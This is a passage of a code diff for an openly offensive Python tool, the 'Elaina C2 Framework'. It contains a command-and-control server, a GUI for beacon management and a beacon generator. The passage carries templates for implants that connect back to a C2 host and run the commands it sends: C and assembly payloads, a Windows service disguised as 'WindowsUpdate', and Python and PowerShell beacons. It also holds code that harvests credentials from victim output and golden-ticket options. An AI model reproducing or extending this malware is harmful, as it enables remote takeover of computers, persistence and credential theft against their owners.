         self.host = host
         self.port = port
         self.ssl_enabled = ssl_enabled
@@ -2369,10 +3029,11 @@ class C2Server:
         self.results = {}
         self.beacon_config = self._generate_beacon_config()
         self._save_beacon_config()
-        self.encryption = AdvancedEncryption()
-        self.domain_generator = AdvancedDomainGenerator()
+        self.encryption = Encryption()
+        self.domain_generator = DomainGenerator()
         self.team_server = None
         self.bof_manager = None
+        self.profile = C2Profile(profile_path)
         
     def _generate_beacon_config(self):
         config = {
@@ -2574,7 +3235,14 @@ class C2Server:
             if not tasks:
                 return
             
+            http_get_config = self.profile.get_http_get_config()
+            server_output = http_get_config.get("server", {}).get("output", {})
+            
             data = json.dumps({"tasks": tasks}).encode('utf-8')
+            
+            if server_output and server_output.get("encoding") == "base64":
+                data = base64.b64encode(data)
+            
             client["socket"].send(data)
             
             logger.debug(f"Sent {len(tasks)} tasks to {client_id}")
@@ -2622,7 +3290,6 @@ class C2Server:
             self.team_server.stop()
             
         logger.info("C2 server stopped")
-
 class OutputDisplayWidget(QWidget):
     def __init__(self, parent=None):
         super().__init__(parent)
@@ -2839,7 +3506,6 @@ class OutputDisplayWidget(QWidget):
         except Exception as e:
             print(f"Error saving output: {str(e)}")
             return False
-
 class BeaconNode(QGraphicsEllipseItem):
     def __init__(self, beacon_id, beacon_info, x, y, radius=30):
         super().__init__(0, 0, radius*2, radius*2)
@@ -2861,7 +3527,6 @@ class BeaconNode(QGraphicsEllipseItem):
         
     def get_beacon_info(self):
         return self.beacon_info
-
 class BeaconConnection(QGraphicsLineItem):
     def __init__(self, source_node, dest_node):
         super().__init__()
@@ -2875,7 +3540,6 @@ class BeaconConnection(QGraphicsLineItem):
         source_pos = self.source.scenePos()
         dest_pos = self.dest.scenePos()
         self.setLine(source_pos.x(), source_pos.y(), dest_pos.x(), dest_pos.y())
-
 class BeaconGraphicsView(QGraphicsView):
     def __init__(self, parent=None):
         super().__init__(parent)
@@ -2910,8 +3574,7 @@ class BeaconGraphicsView(QGraphicsView):
         self.scene.clear()
         self.nodes = {}
         self.connections = []
-
-class EnhancedBeaconInteractDialog(QDialog):
+class BeaconInteractDialog(QDialog):
     command_sent = pyqtSignal(str, str)
     
     def __init__(self, parent=None, beacon_id=None, beacon_info=None):
@@ -3333,8 +3996,7 @@ class EnhancedBeaconInteractDialog(QDialog):
                 self.command_input.clear()
         else:
             super().keyPressEvent(event)
-
-class ElainaMainWindow(QMainWindow):
+class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
         self.beacons = {}
@@ -3343,10 +4005,27 @@ class ElainaMainWindow(QMainWindow):
         self.team_server = None
         self.script_engine = None
         self.bof_manager = None
+        self.listeners = {}
+        self.load_listeners()
         self.init_ui()
         
+    def load_listeners(self):
+        if os.path.exists(LISTENERS_FILE):
+            try:
+                with open(LISTENERS_FILE, 'r') as f:
+                    self.listeners = json.load(f)
+            except:
+                self.listeners = {}
+    
+    def save_listeners(self):
+        try:
+            with open(LISTENERS_FILE, 'w') as f:
+                json.dump(self.listeners, f, indent=2)
+        except:
+            pass
+        
     def init_ui(self):
-        self.setWindowTitle("Elaina Ultimate C2 Framework")
+        self.setWindowTitle("Elaina C2 Framework")
         self.setMinimumSize(1200, 800)
         self.setWindowIcon(QIcon.fromTheme("network-wired"))
         
@@ -3364,6 +4043,7 @@ class ElainaMainWindow(QMainWindow):
         self.create_attacks_tab()
         self.create_c2_tab()
         self.create_listener_tab()
+        self.create_beacon_generator_tab()
         self.create_scripts_tab()
         self.create_team_server_tab()
         self.create_view_tab()
@@ -3377,7 +4057,7 @@ class ElainaMainWindow(QMainWindow):
         self.setup_system_tray()
         self.setup_timers()
         
-        self.script_engine = ElainaScriptEngine(self)
+        self.script_engine = ScriptEngine(self)
         self.script_engine.load_all_scripts()
         
         if not os.path.exists(BOF_DIR):
@@ -3799,7 +4479,78 @@ class ElainaMainWindow(QMainWindow):
         self.listeners_table.setSortingEnabled(True)
         layout.addWidget(self.listeners_table)
         
+        self.update_listeners_table()
+        
         self.tab_widget.addTab(listener_widget, "Listeners")
+        
+    def create_beacon_generator_tab(self):
+        beacon_generator_widget = QWidget()
+        layout = QVBoxLayout(beacon_generator_widget)
+        
+        beacon_config_group = QGroupBox("Beacon Configuration")
+        beacon_config_layout = QFormLayout(beacon_config_group)
+        
+        self.beacon_listener_combo = QComboBox()
+        self.update_beacon_listener_combo()
+        beacon_config_layout.addRow("Listener:", self.beacon_listener_combo)
+        
+        self.beacon_format_combo = QComboBox()
+        self.beacon_format_combo.addItems(["EXE", "PY", "PS1", "RAW"])
+        beacon_config_layout.addRow("Output Format:", self.beacon_format_combo)
+        
+        self.beacon_arch_combo = QComboBox()
+        self.beacon_arch_combo.addItems(["x86", "x64"])
+        beacon_config_layout.addRow("Architecture:", self.beacon_arch_combo)
+        
+        self.beacon_profile_input = QLineEdit()
+        self.beacon_profile_input.setPlaceholderText("Path to .profile or .json file")
+        beacon_profile_layout = QHBoxLayout()
+        beacon_profile_layout.addWidget(self.beacon_profile_input)
+        
+        self.beacon_profile_browse_button = QPushButton("Browse")
+        self.beacon_profile_browse_button.clicked.connect(self.browse_beacon_profile)
+        beacon_profile_layout.addWidget(self.beacon_profile_browse_button)
+        
+        beacon_config_layout.addRow("Profile:", beacon_profile_layout)
+        
+        self.beacon_sleep_input = QSpinBox()
+        self.beacon_sleep_input.setRange(1, 3600)
+        self.beacon_sleep_input.setValue(60)
+        beacon_config_layout.addRow("Sleep Time (seconds):", self.beacon_sleep_input)
+        
+        self.beacon_jitter_input = QDoubleSpinBox()
+        self.beacon_jitter_input.setRange(0.0, 1.0)
+        self.beacon_jitter_input.setSingleStep(0.1)
+        self.beacon_jitter_input.setValue(0.3)
+        beacon_config_layout.addRow("Jitter:", self.beacon_jitter_input)
+        
+        self.beacon_stealth_checkbox = QCheckBox()
+        self.beacon_stealth_checkbox.setChecked(True)
+        beacon_config_layout.addRow("Stealth Mode:", self.beacon_stealth_checkbox)
+        
+        layout.addWidget(beacon_config_group)
+        
+        output_group = QGroupBox("Output")
+        output_layout = QFormLayout(output_group)
+        
+        self.beacon_output_path_input = QLineEdit()
+        self.beacon_output_path_input.setPlaceholderText("Path to save beacon")
+        beacon_output_path_layout = QHBoxLayout()
+        beacon_output_path_layout.addWidget(self.beacon_output_path_input)
+        
+        self.beacon_output_browse_button = QPushButton("Browse")
+        self.beacon_output_browse_button.clicked.connect(self.browse_beacon_output)
+        beacon_output_path_layout.addWidget(self.beacon_output_browse_button)
+        
+        output_layout.addRow("Output Path:", beacon_output_path_layout)
+        
+        layout.addWidget(output_group)
+        
+        generate_button = QPushButton("Generate Beacon")
+        generate_button.clicked.connect(self.generate_beacon)
+        layout.addWidget(generate_button)
+        
+        self.tab_widget.addTab(beacon_generator_widget, "Beacon Generator")
         
     def create_scripts_tab(self):
         scripts_widget = QWidget()
@@ -4082,7 +4833,7 @@ class ElainaMainWindow(QMainWindow):
         row = selected_items[0].row()
         beacon_id = self.beacons_table.item(row, 0).text()
         
-        dialog = EnhancedBeaconInteractDialog(self, beacon_id, self.beacons.get(beacon_id, {}))
+        dialog = BeaconInteractDialog(self, beacon_id, self.beacons.get(beacon_id, {}))
         dialog.command_sent.connect(self.send_beacon_command)
         dialog.exec_()
         
@@ -4189,7 +4940,7 @@ class ElainaMainWindow(QMainWindow):
         key_file = self.c2_key_input.text() if ssl_enabled else None
         profile_path = self.c2_profile_input.text() if self.c2_profile_input.text() else None
         
-        self.c2_server = C2Server(host, port, ssl_enabled, cert_file, key_file)
+        self.c2_server = C2Server(host, port, ssl_enabled, cert_file, key_file, profile_path)
         
         if self.c2_server.start():
             self.c2_status_label.setText("Running")
@@ -4371,7 +5122,7 @@ class ElainaMainWindow(QMainWindow):
                     if stealth_mode:
                         beacon = StealthBeacon(host, port, beacon_type, ssl_enabled, profile_path)
                     else:
-                        beacon = OptimizedBeacon(host, port, beacon_type, ssl_enabled, profile_path)
+                        beacon = Beacon(host, port, beacon_type, ssl_enabled, profile_path)
                     
                     beacon.sleep_time = sleep_time
                     beacon.jitter = jitter
@@ -4408,7 +5159,6 @@ class ElainaMainWindow(QMainWindow):
                 
     def generate_beacon_code(self, beacon):
         beacon_code = f"""#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 import os
 import sys
 import time
@@ -4421,7 +5171,6 @@ import threading
 import platform
 import getpass
 from datetime import datetime
-
 class Beacon:
     def __init__(self):
         self.c2_host = "{beacon.c2_host}"
@@ -4602,7 +5351,6 @@ class Beacon:
             return True
         except:
             return False
-
 if __name__ == "__main__":
     beacon = Beacon()
     beacon.start()
@@ -4725,13 +5473,10 @@ if __name__ == "__main__":
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <string.h>
-
 #pragma comment(lib, "ws2_32.lib")
-
 #define C2_HOST "{listener_info['host']}"
 #define C2_PORT {listener_info['port']}
 #define SLEEP_TIME 5000
-
 DWORD WINAPI BeaconThread(LPVOID lpParameter) {{
     WSADATA wsaData;
     SOCKET sock;
@@ -4790,7 +5535,6 @@ DWORD WINAPI BeaconThread(LPVOID lpParameter) {{
     WSACleanup();
     return 0;
 }}
-
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
     HANDLE hThread = CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
     if (hThread) {{
@@ -4816,13 +5560,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <string.h>
-
 #pragma comment(lib, "ws2_32.lib")
-
 #define C2_HOST "{listener_info['host']}"
 #define C2_PORT {listener_info['port']}
 #define SLEEP_TIME 5000
-
 DWORD WINAPI BeaconThread(LPVOID lpParameter) {{
     WSADATA wsaData;
     SOCKET sock;
@@ -4881,7 +5622,6 @@ DWORD WINAPI BeaconThread(LPVOID lpParameter) {{
     WSACleanup();
     return 0;
 }}
-
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
     switch (ul_reason_for_call) {{
         case DLL_PROCESS_ATTACH:
@@ -4906,39 +5646,31 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <string.h>
-
 #pragma comment(lib, "ws2_32.lib")
-
 #define C2_HOST "{listener_info['host']}"
 #define C2_PORT {listener_info['port']}
 #define SLEEP_TIME 5000
 #define SERVICE_NAME "WindowsUpdate"
-
 SERVICE_STATUS        g_ServiceStatus = {{0}};
 SERVICE_STATUS_HANDLE   g_StatusHandle = NULL;
 HANDLE                 g_hServiceStopEvent = INVALID_HANDLE_VALUE;
-
 VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
 VOID WINAPI ServiceCtrlHandler(DWORD Opcode);
 DWORD WINAPI BeaconThread(LPVOID lpParameter);
-
 int main(int argc, char *argv[]) {{
     SERVICE_TABLE_ENTRY ServiceTable[] =
     {{
         {{SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain}},
         {{NULL, NULL}}
     }};
-
     if (StartServiceCtrlDispatcher(ServiceTable) == 0) {{
         return 1;
     }}
     return 0;
 }}
-
 VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {{
     DWORD status = 0;
     DWORD specificError = 0xfffffff;
-
     g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
     g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
     g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
@@ -4946,12 +5678,10 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {{
     g_ServiceStatus.dwServiceSpecificExitCode = 0;
     g_ServiceStatus.dwCheckPoint = 0;
     g_ServiceStatus.dwWaitHint = 0;
-
     g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
     if (g_StatusHandle == (SERVICE_STATUS_HANDLE)0) {{
         return;
     }}
-
     g_hServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
     if (g_hServiceStopEvent == NULL) {{
         g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
@@ -4959,20 +5689,15 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {{
         SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
         return;
     }}
-
     g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-
     // Start beacon thread
     CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
-
     WaitForSingleObject(g_hServiceStopEvent, INFINITE);
-
     g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
     return;
 }}
-
 VOID WINAPI ServiceCtrlHandler(DWORD Opcode) {{
     switch (Opcode) {{
         case SERVICE_CONTROL_PAUSE:
@@ -4994,7 +5719,6 @@ VOID WINAPI ServiceCtrlHandler(DWORD Opcode) {{
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
     return;
 }}
-
 DWORD WINAPI BeaconThread(LPVOID lpParameter) {{
     WSADATA wsaData;
     SOCKET sock;
@@ -5060,7 +5784,6 @@ DWORD WINAPI BeaconThread(LPVOID lpParameter) {{
         if format_type == "elf":
             payload_code = f"""section .text
 global _start
-
 _start:
     ; Create socket
     push 0x29
@@ -5144,11 +5867,9 @@ import time
 import socket
 import subprocess
 import threading
-
 C2_HOST = "{listener_info['host']}"
 C2_PORT = {listener_info['port']}
 SLEEP_TIME = 5
-
 def beacon():
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -5177,7 +5898,6 @@ def beacon():
         pass
     finally:
         sock.close()
-
 if __name__ == "__main__":
     beacon_thread = threading.Thread(target=beacon)
     beacon_thread.daemon = True
@@ -5196,7 +5916,6 @@ if __name__ == "__main__":
         if format_type == "macho":
             payload_code = f"""section .text
 global _main
-
 _main:
     ; Create socket
     push 0x2000002
@@ -5275,11 +5994,9 @@ import time
 import socket
 import subprocess
 import threading
-
 C2_HOST = "{listener_info['host']}"
 C2_PORT = {listener_info['port']}
 SLEEP_TIME = 5
-
 def beacon():
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -5308,7 +6025,6 @@ def beacon():
         pass
     finally:
         sock.close()
-
 if __name__ == "__main__":
     beacon_thread = threading.Thread(target=beacon)
     beacon_thread.daemon = True
@@ -5325,11 +6041,9 @@ if __name__ == "__main__":
             raise Exception("Invalid format for PowerShell payload")
         
         payload_code = f"""# PowerShell Beacon for Elaina C2 Framework
-
 $C2Host = "{listener_info['host']}"
 $C2Port = {listener_info['port']}
 $SleepTime = 5
-
 function Invoke-Beacon {{
     try {{
         $client = New-Object System.Net.Sockets.TCPClient($C2Host, $C2Port)
@@ -5369,7 +6083,6 @@ function Invoke-Beacon {{
         if ($client) {{ $client.Close() }}
     }}
 }}
-
 # Start beacon in a separate thread
 $beaconThread = New-Object System.Threading.ThreadStart {{
     Invoke-Beacon
@@ -5377,7 +6090,6 @@ $beaconThread = New-Object System.Threading.ThreadStart {{
 $thread = New-Object System.Threading.Thread($beaconThread)
 $thread.IsBackground = $true
 $thread.Start()
-
 # Keep the process running
 try {{
     while ($true) {{
@@ -5407,13 +6119,11 @@ import getpass
 import urllib.request
 import urllib.parse
 import ssl
-
 C2_HOST = "{listener_info['host']}"
 C2_PORT = {listener_info['port']}
 C2_TYPE = "{listener_info['type'].lower()}"
 SLEEP_TIME = 5
 JITTER = 0.3
-
 class Beacon:
     def __init__(self):
         self.c2_host = C2_HOST
@@ -5610,7 +6320,6 @@ class Beacon:
             return True
         except:
             return False
-
 if __name__ == "__main__":
     beacon = Beacon()
     beacon.start()
@@ -5624,7 +6333,6 @@ if __name__ == "__main__":
         if architecture == "x86":
             payload_code = f"""section .text
 global _start
-
 _start:
     ; Create socket
     xor eax, eax
@@ -5695,7 +6403,6 @@ beacon_loop:
         else:  # x64
             payload_code = f"""section .text
 global _start
-
 _start:
     ; Create socket
     push 0x29
@@ -5781,14 +6488,20 @@ beacon_loop:
         ssl_enabled = self.listener_ssl_checkbox.isChecked()
         
         if name and host:
-            row_position = self.listeners_table.rowCount()
-            self.listeners_table.insertRow(row_position)
+            if name in self.listeners:
+                QMessageBox.warning(self, "Error", f"Listener with name '{name}' already exists")
+                return
+                
+            self.listeners[name] = {
+                "type": listener_type,
+                "host": host,
+                "port": port,
+                "ssl_enabled": ssl_enabled,
+                "status": "running"
+            }
             
-            self.listeners_table.setItem(row_position, 0, QTableWidgetItem(name))
-            self.listeners_table.setItem(row_position, 1, QTableWidgetItem(listener_type))
-            self.listeners_table.setItem(row_position, 2, QTableWidgetItem(host))
-            self.listeners_table.setItem(row_position, 3, QTableWidgetItem(str(port)))
-            self.listeners_table.setItem(row_position, 4, QTableWidgetItem("Running"))
+            self.save_listeners()
+            self.update_listeners_table()
             
             self.log_entries.append({
                 "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
@@ -5815,21 +6528,10 @@ beacon_loop:
                                     QMessageBox.Yes | QMessageBox.No)
         
         if reply == QMessageBox.Yes:
-            self.listeners_table.removeRow(row)
-            
-            self.log_entries.append({
-                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "action": "remove_listener",
-                "target": listener_name,
-                "status": "success"
-            })
-            
-            self.status_bar.showMessage(f"Listener {listener_name} removed")
-            
-    def remove_listener_by_name(self, listener_name):
-        for row in range(self.listeners_table.rowCount()):
-            if self.listeners_table.item(row, 0).text() == listener_name:
-                self.listeners_table.removeRow(row)
+            if listener_name in self.listeners:
+                del self.listeners[listener_name]
+                self.save_listeners()
+                self.update_listeners_table()
                 
                 self.log_entries.append({
                     "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
@@ -5839,9 +6541,55 @@ beacon_loop:
                 })
                 
                 self.status_bar.showMessage(f"Listener {listener_name} removed")
-                return True
+                
+    def remove_listener_by_name(self, listener_name):
+        if listener_name in self.listeners:
+            del self.listeners[listener_name]
+            self.save_listeners()
+            self.update_listeners_table()
+                
+            self.log_entries.append({
+                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "action": "remove_listener",
+                "target": listener_name,
+                "status": "success"
+            })
+                
+            self.status_bar.showMessage(f"Listener {listener_name} removed")
+            return True
         return False
         
+    def update_listeners_table(self):
+        self.listeners_table.setRowCount(len(self.listeners))
+        
+        row = 0
+        for name, info in self.listeners.items():
+            self.listeners_table.setItem(row, 0, QTableWidgetItem(name))
+            self.listeners_table.setItem(row, 1, QTableWidgetItem(info["type"]))
+            self.listeners_table.setItem(row, 2, QTableWidgetItem(info["host"]))
+            self.listeners_table.setItem(row, 3, QTableWidgetItem(str(info["port"])))
+            self.listeners_table.setItem(row, 4, QTableWidgetItem(info["status"]))
+            
+            row += 1
+        
+        self.listeners_table.resizeColumnsToContents()
+        self.update_beacon_listener_combo()
+        
+    def update_beacon_listener_combo(self):
+        self.beacon_listener_combo.clear()
+        for name in self.listeners.keys():
+            self.beacon_listener_combo.addItem(name)
+        
+    def browse_beacon_profile(self):
+        file_path, _ = QFileDialog.getOpenFileName(self, "Select Profile", "", "Profile Files (*.profile *.json);;All Files (*)")
+        if file_path:
+            self.beacon_profile_input.setText(file_path)
+            
+    def browse_beacon_output(self):
+        file_path, _ = QFileDialog.getSaveFileName(self, "Save Beacon", "", "All Files (*)")
+        if file_path:
+            self.beacon_output_path_input.setText(file_path)
+            
     def new_script(self):
         self.script_editor.clear()
         
@@ -5940,7 +6688,7 @@ beacon_loop:
         if file_path:
             try:
                 with open(file_path, 'w') as f:
-                    f.write("=== ELAINA ULTIMATE OUTPUT ===\n")
+                    f.write("=== ELAINA OUTPUT ===\n")
                     f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                     
                     f.write("=== BEACONS ===\n\n")
@@ -5963,14 +6711,13 @@ beacon_loop:
                     
                     f.write("\n")
                     
-                    if hasattr(self, 'enhanced_output'):
-                        self.enhanced_output.save_output(file_path)
+                    if hasattr(self, 'output_display'):
+                        self.output_display.save_output(file_path)
                 
                 QMessageBox.information(self, "Success", f"All output saved to {file_path}")
             except Exception as e:
                 QMessageBox.critical(self, "Error", f"Failed to save output: {str(e)}")
-
-class EnhancedElainaMainWindow(ElainaMainWindow):
+class EnhancedMainWindow(MainWindow):
     def __init__(self):
         super().__init__()
         self.output_displays = {}
@@ -5988,8 +6735,8 @@ class EnhancedElainaMainWindow(ElainaMainWindow):
                             if layout.itemAt(0) and isinstance(layout.itemAt(0).widget(), QTextEdit):
                                 layout.itemAt(0).widget().deleteLater()
                             
-                            self.enhanced_output = OutputDisplayWidget()
-                            layout.addWidget(self.enhanced_output)
+                            self.output_display = OutputDisplayWidget()
+                            layout.addWidget(self.output_display)
                         break
                 break
                 
@@ -6002,19 +6749,19 @@ class EnhancedElainaMainWindow(ElainaMainWindow):
         row = selected_items[0].row()
         beacon_id = self.beacons_table.item(row, 0).text()
         
-        dialog = EnhancedBeaconInteractDialog(self, beacon_id, self.beacons.get(beacon_id, {}))
+        dialog = BeaconInteractDialog(self, beacon_id, self.beacons.get(beacon_id, {}))
         dialog.command_sent.connect(self.send_beacon_command)
         dialog.exec_()
         
     def add_beacon_result(self, beacon_id, result):
-        if hasattr(self, 'enhanced_output'):
+        if hasattr(self, 'output_display'):
             timestamp = datetime.now().strftime('%H:%M:%S')
             
             if "stdout" in result and result["stdout"]:
-                self.enhanced_output.add_console_output(f"[{timestamp}] {result['stdout']}")
+                self.output_display.add_console_output(f"[{timestamp}] {result['stdout']}")
             
             if "stderr" in result and result["stderr"]:
-                self.enhanced_output.add_console_output(f"[{timestamp}] {result['stderr']}", "#FF0000")
+                self.output_display.add_console_output(f"[{timestamp}] {result['stderr']}", "#FF0000")
             
             self.extract_credentials(result.get("stdout", "") + result.get("stderr", ""), beacon_id)
             self.extract_sysinfo(result.get("stdout", "") + result.get("stderr", ""), beacon_id)
@@ -6051,10 +6798,10 @@ class EnhancedElainaMainWindow(ElainaMainWindow):
                 if isinstance(match, tuple):
                     for m in match:
                         if m and len(m) > 3:
-                            self.enhanced_output.add_credential("Unknown", m, "Hash/Token", source)
+                            self.output_display.add_credential("Unknown", m, "Hash/Token", source)
                 else:
                     if match and len(match) > 3:
-                        self.enhanced_output.add_credential("Unknown", match, "Hash/Token", source)
+                        self.output_display.add_credential("Unknown", match, "Hash/Token", source)
         
         for pattern in user_pass_patterns:
             matches = re.findall(pattern, text)
@@ -6063,7 +6810,7 @@ class EnhancedElainaMainWindow(ElainaMainWindow):
                     username = match[0]
                     password = match[1]
                     if username and password and len(username) > 2 and len(password) > 2:
-                        self.enhanced_output.add_credential(username, password, "Plaintext", source)
+                        self.output_display.add_credential(username, password, "Plaintext", source)
                         
     def extract_sysinfo(self, text, source):
         sysinfo = {}
@@ -6150,7 +6897,7 @@ class EnhancedElainaMainWindow(ElainaMainWindow):
             sysinfo["MAC Addresses"] = macs
             
         if sysinfo:
-            self.enhanced_output.add_sysinfo(sysinfo)
+            self.output_display.add_sysinfo(sysinfo)
             
     def extract_network_info(self, text, source):
         connection_patterns = [
@@ -6212,24 +6959,23 @@ class EnhancedElainaMainWindow(ElainaMainWindow):
                 for port in listening_ports:
                     network_info += f"{port['protocol']:<8} {port['address']:<20} {port['port']:<12} {port['state']:<12}\n"
             
-            self.enhanced_output.add_network_output(network_info, "#0000FF")
-
+            self.output_display.add_network_output(network_info, "#0000FF")
 def execute(target=None, ldap_subnet=None, use_tor=False, tor_pass="yuriontop", use_burp=False, winrm_user=None, winrm_pass=None, pfx_path=None, pfx_password=None, 
             golden_ticket=False, gt_domain=None, gt_user=None, gt_krbtgt_hash=None, gt_sid=None, gt_dc_ip=None, gt_lifetime=10, gt_target=None, gt_command=None,
             c2_server=False, c2_host=None, c2_port=None, c2_ssl=False, c2_cert=None, c2_key=None,
             c2_beacon=False, c2_beacon_host=None, c2_beacon_port=None, c2_beacon_ssl=False,
             silver_c2=False, silver_c2_host=None, silver_c2_port=None, silver_c2_domain=None,
-            gui=False):
+            gui=False, generate_beacon=False, listener_name=None, output_format=None, profile_path=None, output_path=None):
     open(LOG_JSON_PATH, "w").write("[]")
     open(COOKIE_PATH, "w").write("")
     
     if gui:
         global main_window
         app = QApplication(sys.argv)
-        app.setApplicationName("Elaina Ultimate C2 Framework")
+        app.setApplicationName("Elaina C2 Framework")
         app.setApplicationVersion("1.0")
         
-        main_window = EnhancedElainaMainWindow()
+        main_window = EnhancedMainWindow()
         main_window.show()
         
         file_menu = main_window.menuBar().findChild(QMenu, "File")
@@ -6241,6 +6987,56 @@ def execute(target=None, ldap_subnet=None, use_tor=False, tor_pass="yuriontop", 
         sys.exit(app.exec_())
     
     logger.info("Running in CLI mode")
+    
+    if generate_beacon and listener_name and output_format and output_path:
+        if not os.path.exists(LISTENERS_FILE):
+            logger.error("No listeners found. Please create a listener first.")
+            sys.exit(1)
+            
+        try:
+            with open(LISTENERS_FILE, 'r') as f:
+                listeners = json.load(f)
+        except:
+            logger.error("Failed to load listeners file.")
+            sys.exit(1)
+            
+        if listener_name not in listeners:
+            logger.error(f"Listener '{listener_name}' not found.")
+            sys.exit(1)
+            
+        listener_info = listeners[listener_name]
+        
+        parser = ProfileParser()
+        parsed_profile = None
+        if profile_path and os.path.exists(profile_path):
+            parsed_profile = parser.parse_profile(profile_path)
+            if not parser.validate_profile(parsed_profile):
+                logger.error("Invalid profile file.")
+                sys.exit(1)
+        
+        generator = BeaconGenerator(listener_info, parsed_profile or {})
+        
+        try:
+            if output_format == "exe":
+                beacon_code = generator.generate_exe()
+            elif output_format == "py":
+                beacon_code = generator.generate_py_script()
+            elif output_format == "ps1":
+                beacon_code = generator.generate_ps1_script()
+            elif output_format == "raw":
+                beacon_code = generator.generate_raw_shellcode()
+            else:
+                logger.error(f"Unsupported output format: {output_format}")
+                sys.exit(1)
+                
+            with open(output_path, 'w') as f:
+                f.write(beacon_code)
+                
+            logger.info(f"Beacon generated and saved to {output_path}")
+            sys.exit(0)
+        except Exception as e:
+            logger.error(f"Failed to generate beacon: {str(e)}")
+            sys.exit(1)
     
     if c2_server and c2_host and c2_port:
         c2 = C2Server(c2_host, c2_port, c2_ssl, c2_cert, c2_key)
@@ -6258,7 +7054,7 @@ def execute(target=None, ldap_subnet=None, use_tor=False, tor_pass="yuriontop", 
             sys.exit(1)
     
     if c2_beacon and c2_beacon_host and c2_beacon_port:
-        beacon = OptimizedBeacon(c2_beacon_host, c2_beacon_port, "http", c2_beacon_ssl)
+        beacon = Beacon(c2_beacon_host, c2_beacon_port, "http", c2_beacon_ssl)
         if beacon.start():
             logger.info("C2 beacon started successfully")
             sys.exit(0)
@@ -6335,7 +7131,6 @@ def execute(target=None, ldap_subnet=None, use_tor=False, tor_pass="yuriontop", 
             f.write(json.dumps(full_log, indent=2))
     finally:
         driver.quit()
-
 def main():
     parser = argparse.ArgumentParser(description="ELAINA-C2-FRAMEWORK")
     parser.add_argument("url", help="Target URL to scan & attack", nargs='?', default=None)
@@ -6378,6 +7173,12 @@ def main():
     parser.add_argument("--gui", action="store_true", help="Start GUI interface")
     parser.add_argument("--no-gui", action="store_true", help="Force CLI mode")
     
+    parser.add_argument("--generate-beacon", action="store_true", help="Generate a beacon from CLI")
+    parser.add_argument("--listener-name", help="Name of the listener to use for beacon")
+    parser.add_argument("--output-format", choices=["exe", "py", "ps1", "raw"], help="Output format of the beacon")
+    parser.add_argument("--profile-path", help="Path to the .profile or .json file")
+    parser.add_argument("--output-path", help="Path to save the generated beacon")
+    
     args = parser.parse_args()
     
     if args.gui:
@@ -6415,7 +7216,12 @@ def main():
             silver_c2_host=args.silver_c2_host,
             silver_c2_port=args.silver_c2_port,
             silver_c2_domain=args.silver_c2_domain,
-            gui=True
+            gui=True,
+            generate_beacon=args.generate_beacon,
+            listener_name=args.listener_name,
+            output_format=args.output_format,
+            profile_path=args.profile_path,
+            output_path=args.output_path
         )
     elif not args.url and not args.no_gui:
         logger.info("No target URL specified, starting in GUI mode")
@@ -6452,7 +7258,12 @@ def main():
             silver_c2_host=args.silver_c2_host,
             silver_c2_port=args.silver_c2_port,
             silver_c2_domain=args.silver_c2_domain,
-            gui=True
+            gui=True,
+            generate_beacon=args.generate_beacon,
+            listener_name=args.listener_name,
+            output_format=args.output_format,
+            profile_path=args.profile_path,
+            output_path=args.output_path
         )
     else:
         logger.info("Starting in CLI mode")
@@ -6489,8 +7300,12 @@ def main():
             silver_c2_host=args.silver_c2_host,
             silver_c2_port=args.silver_c2_port,
             silver_c2_domain=args.silver_c2_domain,
-            gui=False
+            gui=False,
+            generate_beacon=args.generate_beacon,
+            listener_name=args.listener_name,
+            output_format=args.output_format,
+            profile_path=args.profile_path,
+            output_path=args.output_path
         )
-
 if __name__ == "__main__":
     main()
